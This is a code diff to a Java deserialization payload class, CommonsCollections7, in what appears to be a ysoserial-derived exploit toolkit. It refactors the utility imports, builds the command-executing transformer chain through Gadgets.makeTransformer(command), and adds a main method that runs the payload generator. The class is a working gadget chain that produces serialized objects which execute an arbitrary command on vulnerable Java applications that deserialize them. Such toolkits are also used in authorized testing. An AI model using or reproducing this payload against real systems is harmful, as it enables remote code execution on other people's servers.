@@ -1,5 +1,7 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.map.LazyMap;
@@ -7,8 +9,7 @@ import org.apache.commons.collections.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.TransformerUtil;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.util.HashMap;
 import java.util.Hashtable;
@@ -41,7 +42,7 @@ public class CommonsCollections7 implements ObjectPayload<Hashtable> {
 
 		final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
-		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+		final Transformer[] transformers = Gadgets.makeTransformer(command);
 
 		Map innerMap1 = new HashMap();
 		Map innerMap2 = new HashMap();
@@ -64,5 +65,8 @@ public class CommonsCollections7 implements ObjectPayload<Hashtable> {
 		lazyMap2.remove("yy");
 
 		return hashtable;
+	}
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections7.class, args);
 	}
 }
